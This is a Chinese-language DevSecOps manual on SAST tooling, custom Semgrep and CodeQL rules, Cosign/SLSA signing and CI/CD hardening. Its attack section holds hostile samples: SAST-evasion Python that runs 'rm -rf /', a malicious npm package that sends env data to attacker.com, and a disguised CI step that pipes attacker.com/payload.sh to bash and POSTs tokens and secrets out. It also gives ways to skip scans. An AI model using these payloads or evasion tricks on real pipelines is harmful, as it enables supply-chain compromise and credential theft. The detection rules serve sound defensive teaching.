---
name: devsecops-sast
description: >
  Complete manual for SAST integration in DevSecOps pipelines. Covers Semgrep rule creation,
  GitHub Advanced Security, CodeQL, code signing with Sigstore/Cosign, SBoM provenance
  verification, and CI/CD pipeline hardening. Includes attack simulation (malicious code
  injection, dependency confusion, unsigned artifact deployment) and defense (custom rules,
  signing policies, gating workflows).
domain: cybersecurity
subdomain: devsecops
tags: [sast, semgrep, codeql, code-signing, cosign, sigstore, sbom, github-advanced-security, ci-cd, devsecops]
version: 2.0.0
---

# SAST 与代码完整性验证 — 完整攻防手册

## 适用场景

- 在 CI/CD 管道中部署和调优 SAST 扫描（Semgrep / CodeQL）
- 编写自定义 Semgrep / CodeQL 规则检测业务逻辑漏洞和框架特定缺陷
- 配置 GitHub Advanced Security (GHAS) 代码扫描与 CodeQL 分析
- 实现代码签名（Sigstore/GPG）和容器镜像来源验证（Cosign/SLSA）

**不适用场景**：DAST / IAST 动态测试 — 参见 `api-security-testing`；依赖漏洞扫描 — 参见 `container-security-scanning`；通用代码审计 — 参见各语言的 `code-audit-*` 技能。

## 前置条件

- 熟悉至少一门编程语言（Python / Java / JavaScript / Go）
- CI/CD 管道基础（GitHub Actions / GitLab CI / Jenkins）
- 容器镜像构建和分发流程
- Git 工作流和分支策略

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 SAST 覆盖缺口侦察

```bash
# 1. 检查目标仓库是否启用 SAST
# GitHub: 检查 .github/workflows/ 是否有 codeql 或 semgrep 工作流
gh api repos/{owner}/{repo}/actions/workflows --jq '.workflows[] | select(.name | test("sast|security|codeql|semgrep"; "i")) | .name'

# 2. 检查 GHAS 是否启用
gh api repos/{owner}/{repo} --jq '.security_and_analysis'

# 3. 检查分支保护是否要求 SAST 通过
gh api repos/{owner}/{repo}/branches/main/protection \
  --jq '.required_status_checks.contexts // empty'

# 4. 枚举 CodeQL 配置文件
curl -s "https://api.github.com/repos/{owner}/{repo}/contents/.github/codeql" | jq '.[].name'

# 5. 检查 Semgrep 配置
curl -s "https://api.github.com/repos/{owner}/{repo}/contents/.semgrep.yml" | jq '.content' | base64 -d 2>/dev/null
```

#### 1.2 代码签名状态探测

```bash
# 检查容器镜像签名
cosign verify --key ./cosign.pub {registry}/{image}:{tag} 2>&1 || echo "UNSIGNED"

# 检查 GitHub Artifact Attestations
gh api repos/{owner}/{repo}/attestations/{artifact_digest} --jq '.attestations[] | .signature'

# 检查 SBoM 是否存在
cosign verify-attestation --type sbom --key ./cosign.pub {registry}/{image}:{tag} 2>&1

# 检查 npm 包签名
npm audit signatures 2>/dev/null
```

#### 1.3 CI/CD 管道安全评估

```yaml
# .github/workflows/ 中常见的 SAST 配置缺陷清单：
# - 缺少 pull_request 触发器（仅 push 扫描 = PR 绕过）
# - codeql-action 未固定 SHA（供应链风险）
# - 扫描结果未设为必需检查
# - 外部 PR fork 无法触发扫描（pull_request_target 误用）
# - 缺少自定义查询/规则包
```

### 2. 利用与攻击

#### 2.1 恶意代码注入绕过 SAST

```python
# === 攻击示例：隐藏恶意代码避开 SAST 检测 ===

# 技术 1：动态属性访问绕过污点分析
import os
# SAST 通常不追踪动态属性
attr = "sys" + "tem"
cmd = "rm -rf /"
getattr(os, attr)(cmd)

# 技术 2：反射绕过函数调用追踪
import importlib
mod = importlib.import_module("o" + "s")
mod.system("whoami")

# 技术 3：编码绕过字符串匹配
import base64
exec(base64.b64decode("aW1wb3J0IG9zO29zLnN5c3RlbSgid2hvYW1pIik=").decode())

# 技术 4：lambda 延迟执行绕过数据流分析
trigger = lambda: __import__("subprocess").check_output("id", shell=True)
result = trigger()

# 技术 5：异常处理中的隐藏调用
try:
    1 / 0
except:
    __builtins__.__dict__["__import__"]("os").system("id")
```

#### 2.2 依赖投毒攻击

```json
// package.json — 依赖混淆攻击
{
  "dependencies": {
    "lodash": "^4.17.21",
    // 攻击者在公共 npm 注册同名的内部包
    "@company/internal-sdk": "^1.0.0",
    // typosquatting
    "lodassh": "^4.17.21"
  }
}
```

```bash
# 模拟依赖投毒
# 1. 创建恶意包
mkdir -p /tmp/evil-pkg && cd /tmp/evil-pkg
cat > index.js << 'PKGEOF'
const { execSync } = require('child_process');
try { execSync('curl https://attacker.com/steal?env=$(env | base64)'); } catch(e) {}
module.exports = require('./real-module');
PKGEOF

# 2. 发布到公共注册表（如果内部包未在公共注册表注册）
# npm publish --access public

# 3. 未配置 .npmrc 注册表优先级的 CI/CD 会拉取恶意包
# .npmrc 缺陷：
# @company:registry=https://npm.pkg.github.com   <-- 未配置此项则公共注册表优先
```

#### 2.3 未签名制品部署攻击

```bash
# 场景：攻击者替换 CI/CD 输出中的未签名制品

# 1. 拦截未加密的制品上传
# 攻击 MITM 或仓库管理员权限推送恶意镜像
docker tag malicious-image registry.example.com/app:v1.2.3
docker push registry.example.com/app:v1.2.3

# 2. 无 Cosign 验证 = 直接部署恶意镜像
# kubectl 部署时无 imagePullPolicy 验证签名
kubectl set image deployment/app app=registry.example.com/app:v1.2.3

# 3. SBoM 伪造 — 生成虚假的 SBoM 但内容与实际不符
syft registry.example.com/app:v1.2.3 -o spdx-json > sbom.json
# 攻击者修改 sbom.json 后重新附加（无签名 = 可篡改）
```

#### 2.4 CI/CD 管道投毒

```yaml
# .github/workflows/ci.yml — 注入恶意步骤
name: CI Pipeline
on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # === 正常构建步骤 ===
      - name: Build
        run: make build

      # === 恶意注入（攻击者通过仓库权限或供应链攻击添加） ===
      - name: "Optimize cache"  # 伪装的步骤名
        run: |
          curl -s https://attacker.com/payload.sh | bash
          # 窃取 $GITHUB_TOKEN, secrets.*
          env | grep -E 'TOKEN|KEY|SECRET' | curl -X POST -d @- https://attacker.com/collect
        # 或通过 pull_request_target + 读取仓库秘密

      # === CodeQL 版本不固定 ===
      - uses: github/codeql-action/analyze@v3  # 应固定到 SHA
```

### 3. 工具使用

#### 3.1 Semgrep — SAST 规则测试

```bash
# 安装
pip install semgrep

# 运行社区规则集
semgrep --config auto .                          # 自动选择规则
semgrep --config p/owasp-top-ten .               # OWASP Top 10
semgrep --config p/security-audit .              # 深度安全审计
semgrep --config p/xss .                         # XSS 专项
semgrep --config p/sql-injection .               # SQL 注入

# 运行自定义规则
semgrep --config custom-rules/ .

# JSON 输出（用于 CI/CD 集成）
semgrep --config auto --json . > results.json
jq '.results[] | {rule: .check_id, file: .path, line: .start.line, message: .extra.message}' results.json

# SARIF 输出（GitHub 集成）
semgrep --config auto --sarif -o semgrep.sarif .

# 测试规则准确性
semgrep --validate --config custom-rules/
semgrep --test custom-rules/
```

#### 3.2 CodeQL — 高级查询

```bash
# 安装 CodeQL CLI
wget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql-linux64.zip
unzip codeql-linux64.zip && export PATH="$PWD/codeql:$PATH"

# 创建数据库
codeql database create --language=javascript --source-root=./src js-db
codeql database create --language=python --source-root=./src py-db
codeql database create --language=java --source-root=./src java-db

# 运行标准查询
codeql database analyze js-db javascript-security-extended --format=sarif-latest --output=results.sarif
codeql database analyze py-db python-security-extended --format=sarif-latest --output=results.sarif

# 运行自定义查询
codeql database analyze py-db ./custom-queries/ --format=sarif-latest --output=custom-results.sarif

# 解包查询包
codeql pack download github/codeql-python-queries
```

**CodeQL 定位说明（2025 现状）**：

- **CodeQL 语义数据流最强**：是唯一能做跨过程/跨文件污点数据流分析的 OSS 选项（最接近
  Fortify 标准的能力），适合「深度审计 / 漏洞赏金 / 复杂数据流」。
- **但 CLI 门槛高、规则开发成本高**：需 `database create` + `analyze` 两步、QL 语言学习曲线陡、
  自定义查询开发慢——不适合「PR 快速扫描」（该场景用 Semgrep）。
- **CodeQL + LLM 查询生成是 2025 新方向**：用 LLM 从自然语言/代码模式生成 CodeQL 查询
  （配合 §C.3 LLM 辅助 SAST），降低自定义查询门槛；但 LLM 生成的 QL 需人工核对语义
  （§C.3 局限：LLM 不做真正数据流分析，生成结果必须验证）。

#### 3.3 Cosign / Syft / SLSA 工具链

```bash
# === Cosign：容器签名与验证 ===
# 生成密钥对
cosign generate-key-pair

# 签名容器镜像
cosign sign --key cosign.key registry.example.com/app:v1.2.3

# 验证签名
cosign verify --key cosign.pub registry.example.com/app:v1.2.3

# Keyless 签名（Sigstore）
cosign sign --yes registry.example.com/app:v1.2.3
cosign verify registry.example.com/app:v1.2.3

# === Syft：SBoM 生成 ===
syft registry.example.com/app:v1.2.3 -o spdx-json > sbom.spdx.json
syft dir:./build-output -o cyclonedx-json > sbom.cdx.json

# 附加 SBoM 到镜像
cosign attest --predicate sbom.spdx.json --type spdx --key cosign.key registry.example.com/app:v1.2.3

# 验证 SBoM
cosign verify-attestation --type spdx --key cosign.pub registry.example.com/app:v1.2.3

# === SLSA Provenance ===
# 使用 slsa-github-generator
# 在 GitHub Actions 中自动生成 provenance

# 验证 provenance
slsa-verifier verify-image registry.example.com/app:v1.2.3 \
  --source-uri github.com/{owner}/{repo} \
  --builder-id https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml
```

### 4. 绕过技术

#### 4.1 SAST 规则绕过策略

```python
# === Python 绕过示例 ===

# 1. 路径穿越绕过 — 使用 os.path.join 拼接后 SAST 可能不追踪
import os
user_input = "../../etc/passwd"
safe_path = os.path.join("/app/uploads", user_input)  # SAST 可能标记
# 绕过：使用 pathlib 或 os.path.normpath 后的间接拼接
from pathlib import Path
target = Path("/app/uploads") / user_input  # 某些规则不覆盖 pathlib

# 2. SQL 注入绕过 — f-string vs format
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")  # 通常被检测
# 绕过：使用 .format 间接调用
query = "SELECT * FROM users WHERE id = {}".format(user_id)  # 部分规则未覆盖
cursor.execute(query)

# 3. 命令注入绕过 — 列表形式
os.system("ls " + user_input)         # 通常被检测
subprocess.run(["ls", user_input])     # 较少被检测（但实际更安全）
# 绕过 SAST 但仍可利用（如果 user_input 含 shell 元字符且 shell=True）
subprocess.run("ls " + user_input, shell=True)  # 部分规则不覆盖 subprocess
```

```javascript
// === JavaScript 绕过示例 ===

// 1. 原型污染绕过
Object.assign(target, userInput);       // 通常被检测
target.__proto__[userKey] = userValue;  // 直接赋值绕过
Object.assign(target, JSON.parse(userInput));  // JSON.parse 中间层

// 2. XSS 绕过
element.innerHTML = userInput;                     // 通常被检测
element.insertAdjacentHTML("beforeend", userInput); // 替代 API
$(element).html(userInput);                        // jQuery 方式

// 3. SSRF 绕过
fetch(userControlledUrl);                          // 通常被检测
const http = require(userControlledUrl.startsWith('https') ? 'https' : 'http');
http.get(userControlledUrl);                       // 条件引入绕过
```

#### 4.2 CI/CD 扫描绕过

```bash
# 1. 跳过扫描 — 通过 commit message（如果 CI 支持）
git commit -m "feat: update deps [skip ci]"
git commit -m "[skip codeql]"

# 2. 降级扫描频率
# 修改 codeql-analysis.yml 仅扫描 schedule 而非 push
# on: [schedule]  # 移除 push 和 pull_request 触发

# 3. 排除路径
# .codeqlmanifest.json 或 .semgrepignore 中排除恶意代码路径
echo "vendor/" >> .semgrepignore
echo "third_party/" >> .semgrepignore
# 将恶意代码放在被排除的目录中
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 Semgrep 自定义规则

```yaml
# custom-rules/dangerous-code-execution.yml
rules:
  # 规则 1：检测 exec + base64 组合（常见后门模式）
  - id: python-exec-base64
    languages: [python]
    message: "检测到 exec() 与 base64 解码组合 — 可能是混淆的恶意代码"
    severity: ERROR
    mode: taint
    pattern-sources:
      - patterns:
          - pattern: base64.b64decode(...)
          - pattern: base64.b64decode(...).decode(...)
    pattern-sinks:
      - pattern: exec(...)
      - pattern: eval(...)
    pattern-sanitizers:
      - pattern: re.match($REGEX, ...)
    metadata:
      category: security
      cwe: "CWE-94: Code Injection"
      confidence: HIGH

  # 规则 2：检测动态属性访问绕过
  - id: python-getattr-os-system
    languages: [python]
    message: "检测到 getattr(os,...) 动态调用 — 可能绕过 SAST"
    severity: WARNING
    patterns:
      - pattern: getattr($MOD, $ATTR, ...)
      - pattern-either:
          - pattern: getattr(os, ...)
          - pattern: getattr(__import__("os"), ...)
          - pattern: getattr($MOD, "sys" + "tem")
    metadata:
      category: security
      confidence: MEDIUM

  # 规则 3：检测 subprocess shell=True
  - id: python-subprocess-shell-true
    languages: [python]
    message: "subprocess.run/call with shell=True and external input enables command injection"
    severity: ERROR
    patterns:
      - pattern-either:
          - pattern: subprocess.run(..., shell=True, ...)
          - pattern: subprocess.call(..., shell=True, ...)
          - pattern: subprocess.Popen(..., shell=True, ...)
      - pattern-not: subprocess.run([...], shell=False, ...)
    metadata:
      category: security
      cwe: "CWE-78: OS Command Injection"

  # 规则 4：检测 JavaScript 原型污染
  - id: js-prototype-pollution
    languages: [javascript, typescript]
    message: "检测到可能的 prototype pollution"
    severity: ERROR
    patterns:
      - pattern-either:
          - pattern: $OBJ.__proto__[$KEY] = $VALUE
          - pattern: $OBJ["__proto__"][$KEY] = $VALUE
          - pattern: Object.assign($OBJ.__proto__, ...)
          - pattern: _.merge(..., $REQ.body, ...)
          - pattern: _.extend(..., $REQ.body, ...)
    metadata:
      category: security
      cwe: "CWE-1321: Prototype Pollution"

  # 规则 5：检测未验证的 URL 重定向
  - id: js-open-redirect
    languages: [javascript, typescript]
    message: "检测到用户控制的 URL 重定向"
    severity: WARNING
    mode: taint
    pattern-sources:
      - pattern: $REQ.query.$PARAM
      - pattern: $REQ.params.$PARAM
      - pattern: $REQ.body.$PARAM
    pattern-sinks:
      - pattern: res.redirect(...)
      - pattern: response.redirect(...)
    pattern-sanitizers:
      - pattern: URL.canonicalize(...)
    metadata:
      category: security
      cwe: "CWE-601: URL Redirection"

  # 规则 6：检测硬编码密钥
  - id: hardcoded-secret-generic
    languages: [python, javascript, typescript, java, go]
    message: "检测到硬编码密钥/凭证"
    severity: ERROR
    patterns:
      - pattern-either:
          - pattern: $VAR = "...password..."
          - pattern: $VAR = "...secret..."
          - pattern: $VAR = "...api_key..."
          - pattern: $VAR = "...token..."
          - pattern: |
              password = "..."
          - pattern: |
              api_key = "..."
          - pattern: |
              secret_key = "..."
      - pattern-not: $VAR = ""
      - pattern-not: $VAR = $ENV_VAR
      - pattern-not: |
          password = os.environ.get(...)
    metadata:
      category: security
      cwe: "CWE-798: Hard-coded Credentials"
```

#### 5.1b Semgrep 规则语法速查（pattern 组合 / metavariable / focus-metavariable / mode）

**pattern 组合运算符**（`patterns:` 内，全部匹配才算命中）：

| 运算符 | 语义 |
|--------|------|
| `pattern:` | 必须匹配 |
| `pattern-either:` | 任一子 pattern 匹配 |
| `pattern-not:` | 必须**不**匹配 |
| `pattern-inside:` | 匹配必须位于某个外层模式内 |
| `pattern-not-inside:` | 匹配不得位于某个外层模式内 |
| `pattern-regex:` | 正则匹配（对捕获文本） |
| `metavariable-regex:` | 对某 metavariable 绑定的文本做正则 |
| `metavariable-pattern:` | 对某 metavariable 的绑定再套子规则 |
| `metavariable-comparison:` | 对 metavariable 做值比较 |
| `focus-metavariable:` | 只把命中范围聚焦到该 metavariable |

```yaml
rules:
  - id: example-combined
    languages: [python]
    message: "组合示例"
    severity: WARNING
    patterns:
      - pattern: $X.execute($SQL)
      - pattern-not: $X.execute($SQL, $PARAMS)      # 排除已参数化
      - metavariable-regex:                          # 对 $SQL 文本做正则
          metavariable: $SQL
          regex: (?i)(select|insert|update|delete)
      - focus-metavariable: $SQL                     # 命中范围只标 $SQL
```

**mode（规则运行模式）**：

| mode | 用途 | 关键字段 |
|------|------|----------|
| `search`（默认） | 单点模式匹配 | `pattern(s)` |
| `taint` | 污点数据流（source→sink，可含 sanitizer） | `pattern-sources` / `pattern-sinks` / `pattern-sanitizers` |
| `join` | 跨文件/跨规则关联（多 pattern 间 join） | `on:` + `rules:` |

```yaml
rules:
  - id: taint-example
    mode: taint
    languages: [python]
    message: "用户输入进入命令执行"
    severity: ERROR
    pattern-sources:
      - pattern: request.args.get(...)
      - pattern: request.form.get(...)
    pattern-sinks:
      - pattern: os.system(...)
      - pattern: subprocess.run(..., shell=True, ...)
    pattern-sanitizers:
      - pattern: re.match(...)
```

**规则测试与调试（`semgrep --test`）**：

```python
# custom-rules/my-rule.test.py
# ruleid: example-combined
cursor.execute("SELECT * FROM users WHERE id=" + uid)

# ok: example-combined
cursor.execute("SELECT * FROM users WHERE id=?", (uid,))
```

```bash
# 校验规则语法（必做，规则类内容以真实语法为准）
semgrep --validate --config custom-rules/

# 跑测试文件，核对 ruleid/ok 标注
semgrep --test custom-rules/
# 输出：my-rule: 1 OK / 1 KNOWN OK / 0 WRONG / 0 MISSING

# 调试：单规则 + 打印 AST/JSON
semgrep --config custom-rules/my-rule.yml --json .
semgrep --debug --config custom-rules/my-rule.yml .
```

> **调试流程**：`--validate` 过语法 → `--test` 过 ruleid/ok 标注 → 真实目标跑 `--json`
> 核对命中 → 每命中人工复核 + 补调用链（persona 硬规则）。

#### 5.2 CodeQL 自定义查询

```ql
// custom-queries/DangerousDynamicExec.ql
/**
 * @name Dangerous dynamic code execution via getattr
 * @description Detects getattr-based calls to os.system or subprocess that bypass SAST
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.0
 * @id python/dangerous-getattr-exec
 * @tags security
 *       external/cwe/cwe-94
 */

import python
import semmle.python.security.dataflow.CodeInjectionQuery
import semmle.python.Concepts
import semmle.python.dataflow.new.DataFlow

module GetAttrConfig implements DataFlow::ConfigSig {
  predicate isSource(DataFlow::Node source) {
    exists(Call call |
      call.getFunc().(Attribute).getName() = "b64decode" and
      source.asExpr() = call
    )
  }

  predicate isSink(DataFlow::Node sink) {
    exists(Call call |
      call.getFunc().(Name).getId() = "exec" and
      sink.asExpr() = call.getArg(0)
    )
    or
    exists(Call call |
      call.getFunc().(Name).getId() = "eval" and
      sink.asExpr() = call.getArg(0)
    )
  }
}

module GetAttrFlow = TaintTracking::Global<GetAttrConfig>;
import GetAttrFlow::PathGraph

from GetAttrFlow::PathNode source, GetAttrFlow::PathNode sink
where GetAttrFlow::flowPath(source, sink)
select sink.getNode(), source, sink,
  "Dynamic code execution with decoded input from $@.",
  source.getNode(), "base64 decoded data"
```

```ql
// custom-queries/DependencyConfusion.ql
/**
 * @name Dependency confusion risk
 * @description Detects packages that may be vulnerable to dependency confusion attacks
 * @kind problem
 * @problem.severity warning
 * @id python/dependency-confusion
 */

import python

from NameImport imp, string name
where
  name = imp.getName() and
  // 检测类似内部包命名模式但无 registry 配置
  (name.matches("@company/%") or name.matches("company-%")) and
  not exists(File f |
    f.getBaseName() = ".npmrc" or f.getBaseName() = "pip.conf"
  )
select imp, "Package $@ may be vulnerable to dependency confusion — no private registry configured.",
  name, name
```

#### 5.3 Semgrep 规则测试文件

```python
# custom-rules/dangerous-code-execution.test.py
# RULE: python-exec-base64

import base64

# ok: python-exec-base64
data = base64.b64decode("SGVsbG8gV29ybGQ=").decode()
print(data)

# ruleid: python-exec-base64
exec(base64.b64decode("aW1wb3J0IG9z").decode())

# ruleid: python-exec-base64
code = base64.b64decode(input())
eval(code)

# ok: python-exec-base64
result = exec("x = 1")  # 无 base64 — 不匹配
```

```bash
# 运行测试
semgrep --test custom-rules/
# 输出示例:
# custom-rules/dangerous-code-execution.test.py
#   python-exec-base64: 2 OK / 1 KNOWN OK / 0 WRONG / 0 MISSING
```

### 6. 修复方案

#### 6.1 GitHub Advanced Security (GHAS) 完整配置

```yaml
# .github/workflows/codeql-analysis.yml
name: "CodeQL Security Scan"

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # 每周一扫描

permissions:
  actions: read
  contents: read
  security-events: write  # 上传 SARIF

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest
    timeout-minutes: 30
    strategy:
      fail-fast: false
      matrix:
        language: [python, javascript, java]

    steps:
      # 安全实践：固定 Action 版本到 SHA
      - name: Checkout repository
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          fetch-depth: 0  # 完整历史以获得更好的分析

      - name: Initialize CodeQL
        uses: github/codeql-action/init@9e8d0789d4a0c9c9059d22c8b2c871d5d5c4c5b6 # v3.28.9
        with:
          languages: ${{ matrix.language }}
          config-file: ./.github/codeql/codeql-config.yml
          queries: security-extended,security-and-quality

      - name: Autobuild
        uses: github/codeql-action/autobuild@9e8d0789d4a0c9c9059d22c8b2c871d5d5c4c5b6

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@9e8d0789d4a0c9c9059d22c8b2c871d5d5c4c5b6
        with:
          category: "/language:${{ matrix.language }}"
          upload: true
```

```yaml
# .github/codeql/codeql-config.yml
name: Custom CodeQL Configuration

# 查询套件
queries:
  - uses: security-and-quality
  - uses: security-extended

# 自定义查询路径
query-filters:
  - exclude:
      id: python/unreachable-code  # 排除误报

# 路径过滤
paths-ignore:
  - '**/test/**'
  - '**/tests/**'
  - '**/spec/**'
  - '**/*.test.js'
  - '**/vendor/**'

paths:
  - src
  - lib
  - app
```

#### 6.2 Semgrep CI/CD 集成

```yaml
# .github/workflows/semgrep.yml
name: Semgrep SAST Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  semgrep:
    name: Semgrep Scan
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Semgrep Scan
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/security-audit
            p/xss
            p/sql-injection
            p/command-injection
            ./custom-rules/
          publishToken: ${{ secrets.SEMGREP_APP_TOKEN }}
          publishDeployment: ${{ secrets.SEMGREP_DEPLOYMENT_ID }}
          generateSarif: "1"

      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif
```

#### 6.3 代码签名与镜像来源验证

```yaml
# .github/workflows/sign-and-verify.yml
name: Build, Sign, and Verify

on:
  push:
    branches: [main]

permissions:
  contents: read
  packages: write
  id-token: write  # Sigstore keyless 签名需要

jobs:
  build-and-sign:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

      - name: Login to Registry
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build Image
        id: build
        run: |
          docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .

      - name: Push Image
        id: push
        run: |
          docker push ghcr.io/${{ github.repository }}:${{ github.sha }}
          digest=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/${{ github.repository }}:${{ github.sha }} || echo '')
          echo "digest=$digest" >> $GITHUB_OUTPUT

      # Keyless 签名（使用 Sigstore / Fulcio）
      - name: Sign Image with Cosign
        uses: sigstore/cosign-installer@v3
      - run: |
          cosign sign --yes \
            --key env://COSIGN_PRIVATE_KEY \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
        env:
          COSIGN_PRIVATE_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
          COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}

      # 生成并附加 SBoM
      - name: Generate SBoM
        uses: anchore/sbom-action@v0
        with:
          image: ghcr.io/${{ github.repository }}:${{ github.sha }}
          format: spdx-json
          output-file: sbom.spdx.json

      - name: Attach SBoM
        run: |
          cosign attest --predicate sbom.spdx.json \
            --type spdx \
            --key env://COSIGN_PRIVATE_KEY \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
        env:
          COSIGN_PRIVATE_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
          COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}

  # SLSA Provenance 生成
  provenance:
    needs: build-and-sign
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
    with:
      image: ghcr.io/${{ github.repository }}
      digest: ${{ needs.build-and-sign.outputs.digest }}
    permissions:
      contents: read
      packages: write
      id-token: write

  # 部署前验证
  deploy:
    needs: [build-and-sign, provenance]
    runs-on: ubuntu-latest
    steps:
      - name: Verify Signature
        uses: sigstore/cosign-installer@v3
      - run: |
          cosign verify \
            --key env://COSIGN_PUBLIC_KEY \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
        env:
          COSIGN_PUBLIC_KEY: ${{ secrets.COSIGN_PUBLIC_KEY }}

      - name: Verify SBoM Attestation
        run: |
          cosign verify-attestation \
            --type spdx \
            --key env://COSIGN_PUBLIC_KEY \
            ghcr.io/${{ github.repository }}:${{ github.sha }}
        env:
          COSIGN_PUBLIC_KEY: ${{ secrets.COSIGN_PUBLIC_KEY }}

      - name: Verify SLSA Provenance
        run: |
          slsa-verifier verify-image \
            ghcr.io/${{ github.repository }}:${{ github.sha }} \
            --source-uri github.com/${{ github.repository }} \
            --builder-id https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml

      - name: Deploy
        run: echo "All verifications passed — deploying..."
        # 实际部署命令
```

#### 6.4 NPM 包签名与验证策略

```bash
# === NPM 代码签名 ===

# 1. 生成签名密钥
gpg --full-generate-key

# 2. 签名 npm 包
npm pack
gpg --armor --detach-sign my-package-1.0.0.tgz

# 3. 发布带签名的包
npm publish --provenance --access public
# --provenance 使用 Sigstore 在 npmjs.com 上显示来源链接

# 4. 验证已安装包的签名
npm audit signatures

# === .npmrc 安全配置 ===
# .npmrc
@company:registry=https://npm.pkg.github.com   # 内部包走 GitHub
registry=https://registry.npmjs.org             # 默认公共注册表
//npm.pkg.github.com/:_authToken=${NPM_TOKEN}
```

#### 6.5 SAST 管道加固清单

```yaml
# .github/workflows/hardened-sast-pipeline.yml
# 汇总所有加固措施

name: Hardened Security Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

permissions:
  contents: read
  security-events: write
  actions: read

jobs:
  # Job 1: Semgrep
  semgrep-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: returntocorp/semgrep-action@v1
        with:
          config: p/owasp-top-ten p/security-audit ./custom-rules/
      - uses: github/codeql-action/upload-sarif@v3
        if: always()

  # Job 2: CodeQL
  codeql-scan:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        language: [python, javascript]
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with: { fetch-depth: 0 }
      - uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          config-file: ./.github/codeql/codeql-config.yml
      - uses: github/codeql-action/analyze@v3

  # Job 3: 依赖审计
  dependency-review:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0
          vulnerability-check: true
          license-check: true

  # Job 4: Secret 扫描
  secret-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with: { fetch-depth: 0 }
      - name: Gitleaks
        uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  # Job 5: 容器签名（仅 main 分支）
  sign-image:
    needs: [semgrep-scan, codeql-scan, secret-scan]
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      packages: write
      id-token: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Build & Push
        run: |
          docker build -t ghcr.io/${{ github.repository }}:${{ github.sha }} .
          docker push ghcr.io/${{ github.repository }}:${{ github.sha }}
      - uses: sigstore/cosign-installer@v3
      - run: cosign sign --yes ghcr.io/${{ github.repository }}:${{ github.sha }}
```

#### 6.6 分支保护与 SAST 门控

```bash
# 配置分支保护规则：SAST 通过才能合并

# 1. 设置必需状态检查
gh api repos/{owner}/{repo}/branches/main/protection \
  --method PUT \
  --field required_status_checks='{
    "strict": true,
    "contexts": [
      "Semgrep Scan",
      "CodeQL Analysis (python)",
      "CodeQL Analysis (javascript)",
      "Dependency Review",
      "Secret Scan"
    ]
  }' \
  --field enforce_admins=true \
  --field required_pull_request_reviews='{
    "dismiss_stale_reviews": true,
    "require_code_owner_reviews": true
  }'

# 2. 启用 GHAS 功能
gh api repos/{owner}/{repo} \
  --method PATCH \
  --field security_and_analysis='{
    "advanced_security": {"status": "enabled"},
    "secret_scanning": {"status": "enabled"},
    "secret_scanning_push_protection": {"status": "enabled"},
    "dependabot_security_updates": {"status": "enabled"}
  }'
```

---

## 速查表

### SAST 工具选择决策树

```
需要 SAST 工具？
├─ 语言支持要求？
│  ├─ 多语言 → Semgrep (30+ 语言) 或 CodeQL (7 语言，深度分析)
│  ├─ 仅 Java/Python/JS/Go/C/C#/Ruby → CodeQL (数据流分析更强)
│  └─ 需要快速集成 → Semgrep (零配置，低误报)
├─ 集成环境？
│  ├─ GitHub → GHAS + CodeQL + Semgrep（组合使用）
│  ├─ GitLab → Semgrep + GitLab SAST
│  ├─ Jenkins → Semgrep CLI + SonarQube
│  └─ 本地开发 → Semgrep (pre-commit hook)
├─ 自定义规则需求？
│  ├─ 高（业务逻辑） → Semgrep (YAML 规则，学习成本低)
│  ├─ 高（复杂数据流） → CodeQL (QL 语言，功能最强)
│  └─ 低 → 使用社区规则集
└─ 预算？
   ├─ 免费开源 → Semgrep OSS + CodeQL CLI
   ├─ GitHub 团队 → GHAS（含 CodeQL + Secret Scanning）
